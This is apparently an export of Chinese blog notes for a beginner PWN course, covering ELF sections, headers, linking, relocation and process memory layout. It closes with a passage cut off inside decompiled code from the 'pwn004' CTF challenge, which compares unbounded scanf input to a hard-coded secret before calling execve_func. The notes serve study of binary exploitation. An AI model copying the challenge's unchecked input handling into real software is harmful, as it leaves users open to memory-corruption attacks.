定义一个函数func1，它接受一个整数参数ivoid func1(int i) {    printf("%d\n", i); // 打印参数i的值}// 定义主函数main，它是程序的入口点int main(void) {    static int static_var1 = 85; // 在函数内部定义并初始化一个静态变量static_var1，初始值为85    static int static_var2; // 在函数内部定义一个静态变量static_var2，未指定初始值，它会被自动初始化为0    int a = 1; // 在函数内部定义并初始化一个局部变量a，初始值为1    func1(static_var1 + static_var2 + a); // 调用函数func1，参数为static_var1、static_var2和a的和    return a; // main函数返回a的值，也就是1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在再查看一下文件</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709175505000.png" alt="image-20230709175505000"></p><p><strong>注：.rodata段表示只读段</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-13.jpg" alt="001-13"></h2><h3 id="查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o"><a href="#查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o" class="headerlink" title="查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o"></a>查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-15.jpg" alt="001-15"></h3><p>二进制代码段</p><p>汇编结果</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-16.jpg" alt="001-16"></p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709203945016.png" alt="image-20230709203945016"></p><p>因为是16进制，所以两个字符占用一个字节</p><p>右到左指的是字节</p><p><strong>在编程中，我们通常会根据变量的初始化方式来推断它的进制</strong>：如果一个数值前面没有任何前缀，并且只包含0-9的数字，那么我们通常认为它是一个十进制数。如果一个数值前面有<code>0x</code>或<code>0X</code>前缀，那么我们认为它是一个十六进制数。如果一个数值前面有<code>0b</code>或<code>0B</code>前缀，那么我们认为它是一个二进制数。如果一个数值前面有<code>0</code>前缀，那么我们认为它是一个八进制数。</p><h3 id="rodata段"><a href="#rodata段" class="headerlink" title="rodata段"></a>rodata段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709214554282.png" alt="image-20230709214554282"></h3><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709215216928.png" alt="image-20230709215216928"></h3><h3 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-19.jpg" alt="001-19"></h3><p>目标程序编译程序时自定义段不能是.开头</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709220506695.png" alt="image-20230709220506695"></p><h3 id="elf文件结构描述"><a href="#elf文件结构描述" class="headerlink" title="elf文件结构描述"></a>elf文件结构描述</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-20.jpg" alt="001-20"></p><h3 id="elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）"><a href="#elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）" class="headerlink" title="elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）"></a>elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709230802832.png" alt="image-20230709230802832"></p><p><strong>魔数</strong>：第一个字节表示<strong>delete</strong>，后面三个字节分别是<strong>e 、l 、 f</strong> 的<strong>ASCII</strong>值</p><p><strong>注：</strong>当操作系统加载一个可执行文件时，它会检查这个魔数来确定文件的格式，以便知道如何处理这个文件。如果这个魔数不是正确，那么操作系统不会按照ELF文件的方式来处理</p><p>魔数后的<strong>第五个字节01</strong>代表的<strong>32位</strong>，<strong>02</strong>代表<strong>64位</strong>，00代表是<strong>无效文件</strong> </p><p><strong>第六个字节01</strong>代表的是<strong>字节序</strong>，规定elf文件的<strong>大端小端（现在简单理解为存储顺序）</strong></p><p><strong>第七个字节01</strong>代表<strong>版本号<em>（一般固定为1）</em></strong></p><p>后面<strong>9个字节</strong>是<strong>扩展字节</strong>，<strong>没有定义</strong>，编译器可以加入自己的字节</p><p> <strong>“Start of sections headers”（节头开始）</strong>指的是ELF文件中<strong>节头表</strong>（Section Header Table）的起始位置。节头表是ELF文件中存储了各个节（Sections）信息的数据结构。每个节都包含了特定类型的数据，如代码、数据、符号表等。</p><h3 id="elf文件段表"><a href="#elf文件段表" class="headerlink" title="elf文件段表"></a>elf文件段表<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709231031674.png" alt="image-20230709231031674"></h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709233939056.png" alt="image-20230709233939056"></p><p><strong>注：</strong>如果一个段表是由40个0组成，那么它是由40个字节的值为0的连续内存组成的，每个0表示一个字节！！！(必须都为0才行)</p><p><strong>偏移地址</strong>：1092+15x40（15表示第十五个段）</p><h4 id="段描述："><a href="#段描述：" class="headerlink" title="段描述："></a>段描述：</h4><p>段名索引：<strong>11</strong>表示接下来11个字节用来<strong>储存段的名字</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710224448799.png" alt="image-20230710224448799"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710003604077.png" alt="image-20230710003604077"></p><h2 id="三、目标文件格式分析实践"><a href="#三、目标文件格式分析实践" class="headerlink" title="三、目标文件格式分析实践"></a>三、目标文件格式分析实践</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1.touch 创建文件</p><p>2.ls一下</p><p>3.用vim编译器打开文件</p><p>4.敲代码</p><p>5.gcc -c study001.c -m32          ：1.-c选项表示只进行编译而不进行链接   2.编译C语言<strong>源文件</strong>并生成<strong>目标文件</strong></p><p>6.ls查看**.o**文件生成</p><p>7.查看study001.o文件发现是乱码、</p><p>8.objdump -h study001.o 查看目标文件头部信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711102005789.png" alt="image-20230711102005789"></p><h3 id="4-编译文件"><a href="#4-编译文件" class="headerlink" title="4.编译文件"></a>4.编译文件</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710234254606.png" alt="image-20230710234254606"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库int global_int_84; // 定义一个全局变量，名为 global_int_84，但没有初始化，应该有一个初始值，例如 int global_int_84 = 84;int global_uninit_var; // 定义一个未初始化的全局变量，名为 global_uninit_var，默认值为 0void funcl(int i){ // 定义一个函数，名为 funcl，它接受一个整数参数        printf("%d\n",i); // 在控制台上打印参数 i 的值，然后换行}int main(){ // 定义主函数，程序的执行从这里开始        static int static_var = 85; // 定义一个静态局部变量，名为 static_var，初始值为 85        static int static_var2; // 定义一个未初始化的静态局部变量，名为 static_var2，默认值为 0        int a=1; // 定义一个局部变量，名为 a，初始值为 1        int b; // 定义一个未初始化的局部变量，名为 b，其初始值是未定义的        funcl(static_var+static_var2+a+b); // 调用 funcl 函数，参数为 static_var、static_var2、a 和 b 的和        return a; // 主函数返回 a 的值，即 1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按Esc键退出编辑，输入“  ：wq   ” 然后回车</p><p>9.readelf -h study001.o 打开目标文件的<strong>elf头部信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711000106572.png" alt="image-20230711000106572"></p><p>section header string table index: 14</p><p>段表最后一行40个字节是段表名称的<strong>字符串</strong>所在的<strong>段</strong>的信息</p><h3 id="od-study001-o查看文件-amp-用010分析文件"><a href="#od-study001-o查看文件-amp-用010分析文件" class="headerlink" title="od study001.o查看文件&amp;用010分析文件"></a>od study001.o查看文件&amp;用010分析文件</h3><p>od（octal dump）命令可以将文件内容转换为八进制形式，并以十六进制和ASCII码方式显示。这可以帮助我们查看目标文件的二进制数据，包括文件头部、节（section）的内容以及其他数据。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711112050940.png" alt="image-20230711112050940"></p><p>把study001.o放到010中分析</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010437475.png" alt="image-20230711010437475"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010621855.png" alt="image-20230711010621855"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711012214621.png" alt="image-20230711012214621"></p><h2 id="四、符号表："><a href="#四、符号表：" class="headerlink" title="四、符号表："></a>四、符号表：</h2><p>1.符号名=函数名+变量名<strong>（函数和变量统称为符号）</strong></p><p>2.符号是整个链接的粘合器，整个链接<strong>基于符号</strong>才能完成</p><p>3.每一个目标文件都有一个符号表</p><p>4.符号值是函数和变量的<strong>地址</strong></p><p>每16个字节代表一个符号</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链接</title>
      <link href="/du-yu/pwn-begain-study03.html"/>
      <url>/du-yu/pwn-begain-study03.html</url>
      
        <content type="html"><![CDATA[<h1 id="链接（LINKING）"><a href="#链接（LINKING）" class="headerlink" title="链接（LINKING）"></a>链接（LINKING）</h1><h2 id="一、静态链接"><a href="#一、静态链接" class="headerlink" title="一、静态链接"></a>一、静态链接</h2><p>如果目标文件引用了另外一个目标文件，那么需要生成静态链接 </p><h3 id="1-创建两个C源文件"><a href="#1-创建两个C源文件" class="headerlink" title="1.创建两个C源文件"></a>1.创建两个C源文件</h3><h4 id="002linking-c"><a href="#002linking-c" class="headerlink" title="002linking.c"></a>002linking.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">extern int shared;extern void swap(int* a,int* b);int main(){        int a=100;        swap(&amp;a,&amp;shared);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="002linking02-c"><a href="#002linking02-c" class="headerlink" title="002linking02.c"></a>002linking02.c</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">int shared = 1;void swap(int* a,int* b){        *a ^= *b ^= *a ^= *b;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、生成目标文件"><a href="#2、生成目标文件" class="headerlink" title="2、生成目标文件"></a>2、生成目标文件</h3><p>gcc -c 002linking.c  002linking02.c -fno-stack-protector -m32   生成<strong>002linking.o</strong> 和 <strong>002linking02.o</strong>两个**.o**文件(<code>-fno-stack-protector</code>选项用于关闭栈保护)</p><h3 id="3、将两个文件链接成一个可执行文件"><a href="#3、将两个文件链接成一个可执行文件" class="headerlink" title="3、将两个文件链接成一个可执行文件"></a>3、将两个文件链接成一个可执行文件</h3><p>ld -m elf_i386 002linking.o 002linking02.o -e main -o 002linking03</p><p>注：</p><p>1.使用<code>ld</code>链接器，按照32位的Intel架构，将 002linking.o 和 002linking02.o 这两个目标文件链接成一个可执行文件002linking03，可执行文件的入口点是<code>main</code>函数（运行程序时，<code>main</code>函数会被首先执行）。</p><p>2.-m elf_i386：指定了链接器的目标架构为32位的x86架构</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711141344927.png" alt="image-20230711141344927"></p><h3 id="4、静态链接以后多出4个字节"><a href="#4、静态链接以后多出4个字节" class="headerlink" title="4、静态链接以后多出4个字节"></a>4、静态链接以后多出4个字节</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711142353390.png" alt="image-20230711142353390"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711143043203.png" alt="image-20230711143043203"></p><h4 id="查看002linking-o-text段描述-objdump-S"><a href="#查看002linking-o-text段描述-objdump-S" class="headerlink" title="查看002linking.o    text段描述(objdump -S )"></a>查看002linking.o    text段描述(objdump -S )</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204453642.png" alt="image-20230711204453642"></p><h4 id="002linking02-o文件"><a href="#002linking02-o文件" class="headerlink" title="002linking02.o文件"></a>002linking02.o文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204555890.png" alt="image-20230711204555890"></p><h4 id="002linking03文件"><a href="#002linking03文件" class="headerlink" title="002linking03文件"></a>002linking03文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204630037.png" alt="image-20230711204630037"></p><h2 id="二、空间与地址分配"><a href="#二、空间与地址分配" class="headerlink" title="二、空间与地址分配"></a>二、空间与地址分配</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712002022380.png" alt="image-20230712002022380"></p><p>32位的Linux系统，程序的虚拟地址空间通常从0x08048000开始。这是因为Linux内核默认将用户空间程序的基地址（也就是.text段的加载地址）设置为0x08048000。这个地址是在内核源代码中硬编码的。</p><h2 id="三、重定位"><a href="#三、重定位" class="headerlink" title="三、重定位"></a>三、重定位</h2><p>1.上面使用 <strong>ld</strong> 链接器将把两个.o文件链接在一起以创建一个可执行文件时，链接器会<strong>自动处理全局符号</strong>重定位。</p><p>2.链接器首先会读取所有输入的目标文件，并收集所有的符号定义和引用。这些信息存储在符号表中。</p><p>3.然后，链接器会解决所有的符号引用。对于每个引用，链接器会查找对应的符号定义，然后计算出该符号在最终可执行文件中的地址。</p><p>4.最后，链接器会更新所有需要重定位的地址引用。这些引用的位置和方式存储在重定位表中。对于表中的每个条目，链接器会根据符号的最终地址和重定位类型，更新对该符号的引用。</p><h3 id="1、重定位效果：objdump-d-分别查看反汇编结果"><a href="#1、重定位效果：objdump-d-分别查看反汇编结果" class="headerlink" title="1、重定位效果：objdump -d 分别查看反汇编结果"></a>1、重定位效果：objdump -d 分别查看反汇编结果</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712105715702.png" alt="image-20230712105715702"></p><h3 id="2、重定位表"><a href="#2、重定位表" class="headerlink" title="2、重定位表"></a>2、重定位表</h3><p>1、链接器要知道哪些指令要被调整，需要给链接器一个清单，这个清单就是重定位表</p><p>2、重定位表一般是ELF文件的一个段，如.text段重定位表就是rel.text,data段的重定位表就是rel.data</p><h4 id="使用objdump-r-a-o可以看到重定位表"><a href="#使用objdump-r-a-o可以看到重定位表" class="headerlink" title="使用objdump -r a.o可以看到重定位表"></a>使用objdump -r a.o可以看到重定位表</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712113952650.png" alt="image-20230712113952650"></p><p><strong>十六进制寻址：</strong>在”00000028”中，最右边的位是8，它是第0位，所以你将8乘以16的0次方得到8*1=8。</p><p>然后，向左移动一位，你有2，这是第1位，所以你将2乘以16的1次方得到2*16=32。</p><h2 id="四、链接的符号解析功能"><a href="#四、链接的符号解析功能" class="headerlink" title="四、链接的符号解析功能"></a>四、链接的符号解析功能</h2><p>1、a.c在生成目标文件的时候，并没有定义share变量和swap函数，但是在没有链接之前，gcc也不能说这两</p><p>个引用不存在，那么怎么确定是外部引用的符号，还是源代码手滑写错了的符号呢？</p><p>2、那就是用链接器在全局符号表中查找，能找到就进行修正虚拟地址，找不到肯定不能链接通过，因为调</p><p>用了不存在的引用</p><h3 id="1、objdump-s"><a href="#1、objdump-s" class="headerlink" title="1、objdump  -s"></a>1、objdump  -s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712132412141.png" alt="image-20230712132412141"></p><h2 id="五、静态库链接"><a href="#五、静态库链接" class="headerlink" title="五、静态库链接"></a>五、静态库链接</h2><p>静态库</p><p>目前理解就是一个运行调用的 库而已</p><h2 id="六、进程虚拟地址空间"><a href="#六、进程虚拟地址空间" class="headerlink" title="六、进程虚拟地址空间"></a>六、进程虚拟地址空间</h2><p>1、32位操作系统的最大寻址范围位4GB</p><p>2、64位操作系统的最大寻址范围围位17 179 869 184 GB，即2的64次方 = 16EiB，通常而言，操作系统虚</p><p>拟地址空间无需这么大的空间，于是通常设定64位操作系统的虚拟地址寻址空间大小是<strong>48位</strong>，也就是<strong>2的48</strong></p><p><strong>次方</strong> = 256TB</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712164945449.png" alt="image-20230712164945449"></p><h4 id="1-采用十六进制转化位十进制寻址："><a href="#1-采用十六进制转化位十进制寻址：" class="headerlink" title="1.采用十六进制转化位十进制寻址："></a>1.采用十六进制转化位十进制寻址：</h4><p>0xC0000000=<strong>12 * 16^7 + 0 * 16^6 + 0 * 16^5 + 0 * 16^4 + 0 * 16^3 + 0 * 16^2 + 0 * 16^1 + 0 * 16^0</strong>= 3221225472</p><p>0xFFFFFFFF=4,294,967,295=4GB</p><p>0xFFFFFFFF-0xC0000000=1GB</p><h4 id="补充：十六进制转化为2进制"><a href="#补充：十六进制转化为2进制" class="headerlink" title="补充：十六进制转化为2进制"></a>补充：十六进制转化为2进制</h4><p>因为16等于2的4次方，所以每个十六进制数字都可以用4个二进制位来表示。</p><p>例如，如果我们要将F（十六进制中的15）转换为二进制，我们可以这样做：</p><ol><li>首先，我们知道F在十六进制中代表15。</li><li>然后，我们可以将15转换为二进制。这可以通过以下步骤完成：<ul><li>15除以2等于7余1，所以最低位是1。</li><li>7除以2等于3余1，所以下一位是1。</li><li>3除以2等于1余1，所以下一位是1。</li><li>1除以2等于0余1，所以最高位是1。</li></ul></li><li>因此，15在二进制中表示为1111。</li></ol><h2 id="七、装载方式"><a href="#七、装载方式" class="headerlink" title="七、装载方式"></a>七、装载方式</h2><p>和前面计算机基础中的分页技术差不多</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712170412317.png" alt="image-20230712170412317"></p><h2 id="八、覆盖装入"><a href="#八、覆盖装入" class="headerlink" title="八、覆盖装入"></a>八、覆盖装入</h2><p> 原理：目前处理谁的数据就让谁坐在处理的位置上 </p><p>医生看病原理：病人A问诊后被医生叫去拍片，病人B问诊后拍片…，直到病人A拿到片子回来后其他病人停</p><p>止问诊，医生给病人A看片，病人A就是覆盖装入</p><h2 id="九、页映射"><a href="#九、页映射" class="headerlink" title="九、页映射"></a>九、页映射</h2><p>1、页映射不是一下子把程序的所有数据和指令都装入内存</p><p>2、而是将内存和磁盘中所有的数据和指令按照页（page）为单位划分成若干个页</p><p>3、目前常见的页大小为4096字节，也就是4KB，1KB的数据也是交换4KB，交换的就是4KB的倍数</p><h2 id="十、进程虚拟空间分布"><a href="#十、进程虚拟空间分布" class="headerlink" title="十、进程虚拟空间分布"></a>十、进程虚拟空间分布</h2><p>1、合并<strong>相同权限</strong>的段（Section）到同一个节（Segment）</p><p>2、对于相同权限的段，把它们合并到一起当作一个节（Segment）进行映射</p><p>3、节（Segment）装载的角度<strong>重新划分</strong>了ELF的各个段</p><p>之前段已经划分好了，接下来就是划分节了</p><p><strong>如：</strong>滴滴打车，每个人至少叫一 辆车（不可能半辆），相当于ElF文件执行程序至少需要一个页，如果有20个人</p><p>去5个小区，每人一辆车就浪费了，如果按照相同属性划分（同一个小区的为一类）节，就可以只要5辆车，</p><p>利用资源。   合并加载便于页映射，减少出现<strong>1KB</strong>的数据也是交换<strong>4KB</strong>的情况，利用资源</p><p>1、<strong>Section</strong>和<strong>Segment</strong>是对ElF文件描述的两种视图</p><p>2、<strong>Section</strong>偏向于静态链接（链接视图Linking View）</p><p>3、<strong>Segment</strong>偏向于<strong>动态转载</strong>（执行视图Execution View）</p><h3 id="1、例子C源码00204-c"><a href="#1、例子C源码00204-c" class="headerlink" title="1、例子C源码00204.c"></a>1、例子C源码00204.c</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;char*flag ="CTFDU-YU{flag_is_here}";int main(){ printf("%s",flag); return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-静态编译-gcc-static-00204-c-m32-o-00204"><a href="#2-静态编译-gcc-static-00204-c-m32-o-00204" class="headerlink" title="2.静态编译  gcc -static 00204.c -m32 -o 00204"></a>2.静态编译  gcc -static 00204.c -m32 -o 00204</h4><p>生成静态链接可执行文件</p><p>readelf -S text2 查看段信息，readlelf -l text2 查看节信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713003655633.png" alt="image-20230713003655633"></p><ul><li>Type：段的类型。例如，LOAD 表示该段应加载到内存中，NOTE 表示该段包含辅助信息，GNU_STACK 表示该段包含堆栈信息，等等。</li><li>Offset：该段在文件中的偏移量。</li><li>VirtAddr：该段在内存中的虚拟地址（程序入口）</li><li>PhysAddr：该段在内存中的物理地址。对于可执行和共享对象文件，此字段通常被忽略。</li><li>FileSiz：该段在文件中的大小。</li><li>MemSiz：该段在内存中的大小。</li><li>Flg：该段的标志。R 表示可读，W 表示可写，E 表示可执行。</li><li>Align：该段在文件和内存中的对齐</li></ul><p>Section to Segement mapping 中写清楚了那些段映射到了哪些节</p><p>LOAD类型说明是需要映射的，其他不需要映射</p><p>上图就是相同权限的段合并到同一个节中</p><p>前两节通过Flg段得知：</p><p>00 可读可执行 可以看到里面有.text .rodata段</p><p>01 可读可写 可以看到里面有.data段</p><p>Align：字节对齐</p><p>1000h=4kb，所以两个节分别映射到两个页中</p><h2 id="十一、程序表头"><a href="#十一、程序表头" class="headerlink" title="十一、程序表头"></a>十一、程序表头</h2><p>1.ElF可执行文件中有一个专门的数据结构叫程序头表（Program Header Table），用来保存Segment信息</p><p>2.程序头表（Program Header Table）：这部分主要用于程序的加载。它描述了一系列的段（Segment），每个段包含了一些在程序执行时需要加载到内存中的信息。例如，代码段（.text）包含了程序的机器代码，数据段（.data）包含了程序的全局变量等。</p><p>3。无论是静态编译还是动态编译，只要生成了 ELF 格式的可执行文件，就会有程序头表。静态编译和动态编译的主要区别在于，静态编译会将所有的库函数都直接链接到可执行文件中，而动态编译则会在运行时动态链接库函数。这会影响到 ELF 文件的大小和复杂性，但并不会影响到程序头表的存在。</p><p>4.ELF (Executable and Linkable Format) 文件有三种主要类型：可重定位的文件（Relocatable file）、可执行文件（Executable file）和共享对象文件（Shared object file）。</p><ul><li>可重定位的文件（通常是编译器输出的目标文件，扩展名通常为 .o）只包含代码和数据，它们需要通过链接器（linker）与其他目标文件或库文件链接在一起，生成可执行文件或共享对象文件。因为这些文件不需要被直接执行，所以它们通常不包含程序头表（Program Header Table），只包含节头表（Section Header Table）。</li><li>可执行文件和共享对象文件（通常是动态链接库，Linux下扩展名通常为 .so）是需要被装载到内存中执行的，所以它们包含程序头表。程序头表描述了如何将文件的内容加载到内存中以供执行。</li></ul><p>注：共享库是动态库，和静态库有很大区别，每个使用静态库的程序都有一份静态库的副本。</p><h4 id="readelf-h-查看elf文件头信息"><a href="#readelf-h-查看elf文件头信息" class="headerlink" title="readelf -h 查看elf文件头信息"></a>readelf -h 查看elf文件头信息</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713021258414.png" alt="image-20230713021258414"></p><h2 id="十二、堆和栈"><a href="#十二、堆和栈" class="headerlink" title="十二、堆和栈"></a>十二、堆和栈</h2><p>1、虚拟空间地址（VMA）对进程的地址空间进行管理</p><p>2、程序直线所用的栈（Stack）、堆（Heap）空间的表现由VMA来控制</p><p>3、使用/proc可以看到VMA地址和堆栈的映射</p><h3 id="1、例子：-00205-c"><a href="#1、例子：-00205-c" class="headerlink" title="1、例子：    00205.c"></a>1、例子：    00205.c</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char* flag = "ctfshow{flag_is_here}";int main(){ while(1){ sleep(1); printf("%s",flag); fflush(stdout); } return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-gcc-o-00205-2-00205-c-转化为可执行文件"><a href="#1-gcc-o-00205-2-00205-c-转化为可执行文件" class="headerlink" title="1.gcc -o 00205-2 00205.c 转化为可执行文件"></a>1.gcc -o 00205-2 00205.c 转化为可执行文件</h4><h4 id="2-运行00205-2"><a href="#2-运行00205-2" class="headerlink" title="2.运行00205-2"></a>2.运行00205-2</h4><h4 id="3-ps-aux-grep-00205-2获取PID"><a href="#3-ps-aux-grep-00205-2获取PID" class="headerlink" title="3.ps aux | grep 00205-2获取PID"></a>3.ps aux | grep 00205-2获取PID</h4><h4 id="4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射"><a href="#4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射" class="headerlink" title="4.cat /proc/33983/maps  看程序 进程的内存的详细映射"></a>4.cat /proc/33983/maps  看程序 进程的内存的详细映射</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034048625.png" alt="image-20230713034048625"></p><h3 id="2、进程的VMA区域"><a href="#2、进程的VMA区域" class="headerlink" title="2、进程的VMA区域"></a>2、进程的VMA区域</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/002-1.jpg" alt="002-1"></p><h3 id="3、进程栈初始化"><a href="#3、进程栈初始化" class="headerlink" title="3、进程栈初始化"></a>3、进程栈初始化</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034926454.png" alt="image-20230713034926454"></p><h3 id="4、栈空间"><a href="#4、栈空间" class="headerlink" title="4、栈空间"></a>4、栈空间</h3><p>栈空间（Stack Space）是计算机内存中的一种区域，主要用于存储程序运行时的临时数据，如函数调用时的参数、返回地址以及局部变量等。栈空间的特 点是后进先出（LIFO，Last In First Out），即最后进入栈的数据会被最先取出。</p><p>在程序运行时，每当有函数调用发生，系统会在栈空间中为这个函数分配一块区域，这块区域被称为”栈帧”（Stack Frame）。栈帧中存储了这个函数的局部变量、参数以及返回地址等信息。当函数执行完毕后，对应的栈帧就会被销毁，释放其占用的栈空间。</p><p>栈空间的大小通常是有限的。如果程序在运行过程中超出了栈空间的大小限制，就会发生”栈溢出”（Stack Overflow）错误。这通常是由于递归调用过深或者局部变量过多导致的。</p><p>总的来说，栈空间是程序运行时存储临时数据的重要区域，它的管理方式决定了函数调用的工作方式以及程序的运行效率。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713035715924.png" alt="image-20230713035715924"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713041716448.png" alt="image-20230713041716448"></p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn004函数</title>
      <link href="/du-yu/pwn-begain-exerciser-01.html"/>
      <url>/du-yu/pwn-begain-exerciser-01.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn004"><a href="#pwn004" class="headerlink" title="pwn004"></a>pwn004</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 定义一个main函数，它接收三个参数：命令行参数的数量，命令行参数的列表，和环境变量的列表{  char s1[11]; // 定义一个字符数组s1，大小为11  char s2[12]; // 定义一个字符数组s2，大小为12  unsigned __int64 v6; // 定义一个unsigned __int64类型的变量v6  v6 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v6。这通常用于实现堆栈保护  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为无缓冲  setvbuf(stdin, 0LL, 2, 0LL); // 设置stdin的缓冲区模式为无缓冲  strcpy(s1, "CTFshowPWN"); // 将字符串"CTFshowPWN"复制到s1中  logo(); // 调用logo函数，这个函数的具体实现没有给出，可能是用来显示一些信息或者图标  puts("find the secret !"); // 输出字符串"find the secret !"  __isoc99_scanf("%s", s2); // 从stdin读取一个字符串，并存储到s2中  if ( !strcmp(s1, s2) ) // 如果s1和s2相同（strcmp的返回值为0），则执行下一行的函数    execve_func(); // 调用execve_func函数，这个函数的具体实现没有给出，可能是执行一些特定的操作  return 0; // main函数返回0，表示程序正常结束}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="execve-func-函数："><a href="#execve-func-函数：" class="headerlink" title="execve_func()函数："></a>execve_func()函数：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">unsigned __int64 execve_func() // 定义一个返回类型为unsigned __int64的函数execve_func{  char *argv[3]; // 定义一个字符指针数组argv，大小为3。这个数组用来存储execve函数的参数  unsigned __int64 v2; // 定义一个unsigned 